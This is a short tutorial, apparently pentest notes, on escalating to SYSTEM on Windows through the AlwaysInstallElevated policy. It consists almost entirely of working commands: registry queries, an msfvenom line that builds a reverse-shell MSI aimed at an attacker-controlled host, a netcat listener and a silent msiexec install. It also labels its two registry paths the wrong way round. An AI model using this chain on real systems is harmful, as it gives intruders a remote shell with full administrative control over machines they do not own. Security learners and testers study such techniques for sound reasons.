- - -
Here is Great refrence of all **[whomai /priv](https://github.com/gtworek/Priv2Admin)**

The **AlwaysInstallElevated** is a Windows policy that allows unprivileged users to install software through the use of MSI packages using SYSTEM level permissions, which can be exploited to gain administrative access over a Windows machine.
The **AlwaysInstallElevated** value must set to ‘**1**’ for both Local_Machine.

`HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`

And the Current user.

`HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`

## Start :

```cmd
whoami /priv
```

The first step is to check whether the required registry keys are enabled **:**

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=our-ip LPORT=9090 -f msi -o reverse.msi
```

Now transfer this to windows.

```cmd
copy \\**our-ip**\reverse.msi **.**
```

```sh
nc -nvlp 9090
```

```cmd
msiexec /quiet /qn /i reverse.msi
```

 - - -
